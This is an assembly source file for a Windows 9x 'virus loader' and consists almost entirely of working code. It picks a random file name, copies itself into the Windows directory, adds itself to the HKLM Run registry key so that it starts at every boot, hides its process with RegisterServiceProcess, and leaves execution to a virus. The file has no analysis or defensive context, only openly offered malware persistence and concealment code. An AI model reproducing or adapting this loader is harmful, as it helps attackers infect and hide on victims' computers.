
; virus loader (for win9X, exit if NT)
;
; action:
; ~~~~~~
; þ generate random new file name
; þ get current file name
; þ if not in windir
;   {
; þ   copy this file to windows directory
; þ   register new file in registry
;   }
; þ hide current process
; þ exit (to virus)

NAMELEN                 equ     6

HKEY_LOCAL_MACHINE      equ     80000002h
REG_SZ                  equ     1

callW                   macro   x
                        extern  x:proc
                        call    x
                        endm

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

keyname1                db      'Software\Microsoft\Windows\CurrentVersion\Run',0
x1                      equ     byte ptr $
keyname2                db      NAMELEN dup ('?'),0

x2                      equ     byte ptr $+1
fname                   db      '\',NAMELEN dup ('?'),'.exe',0
fname_size              equ     $-fname

file_src                db      1024 dup (?)
file_dst                db      1024 dup (?)

                        .code
start:
                        dd      90909090h  ; special dropper id

                        callW   GetVersion
                        shl     eax, 1
                        jnc     @@exit

; generate random dropper name
                        callW   GetTickCount
                        xchg    ebx, eax
                        xor     ecx, ecx
@@rnd:                  mov     eax, ebx
                        imul    eax, 214013
                        add     eax, 2531011
                        mov     ebx, eax
                        shr     eax, 16
                        imul    eax, 'z'-'a'+1
                        shr     eax, 16
                        add     al, 'a'
                        mov     x1[ecx], al
                        mov     x2[ecx], al
                        inc     ecx
                        cmp     ecx, NAMELEN
                        jb      @@rnd
                        add     byte ptr x1, 'A'-'a'

; get current file name
                        callW   GetCommandLineA
                        xchg    esi, eax

; '-dbg' option
;                       pusha
;@@9:                   cmp     dword ptr [esi], 'gbd-'
;                       je      @@exit
;                       lodsb
;                       or      al, al
;                       jnz     @@9
;                       popa

                        lea     edi, file_src
                        cmp     byte ptr [esi], '"'
                        jne     @@1
                        inc     esi
@@1:                    lodsb
                        cmp     al, 32
                        je      @@2
                        stosb
                        or      al, al
                        jnz     @@1
@@2:                    cmp     byte ptr [edi-1], '"'
                        jne     @@3
                        dec     edi
@@3:                    xor     al, al
                        stosb

; get dest file name
                        push    size file_dst
                        push    offset file_dst
                        callW   GetWindowsDirectoryA
                        lea     edi, file_dst
                        add     edi, eax
                        lea     esi, fname
                        mov     ecx, fname_size
                        lea     ebp, [eax+ecx]
                        rep     movsb

; compare filenames -- if directory same, skip copying
                        lea     esi, file_src
                        lea     edi, file_dst
                        xchg    ecx, eax
                        rep     cmpsb
                        je      @@alredy

; copy curr. file to windir

                        push    1
                        push    offset file_dst
                        push    offset file_src
                        callW   CopyFileA

; register
                        push    esp
                        push    esp
                        push    -1
                        push    0
                        push    offset keyname1
                        push    HKEY_LOCAL_MACHINE
                        callW   RegOpenKeyExA
                        pop     esi

                        push    ebp
                        push    offset file_dst
                        push    REG_SZ
                        push    0
                        push    offset keyname2
                        push    esi
                        callW   RegSetValueExA

                        push    esi
                        callW   RegCloseKey

; hide process
@@alredy:               callW   GetCurrentProcessId
                        push    1
                        push    eax
                        callW   RegisterServiceProcess

@@cycle:                callW   GetCurrentThread
                        push    eax
                        callW   SuspendThread
                        jmp     @@cycle

; exit (return to md)
@@exit:                 push    -1
                        callW   ExitProcess

                        end     start
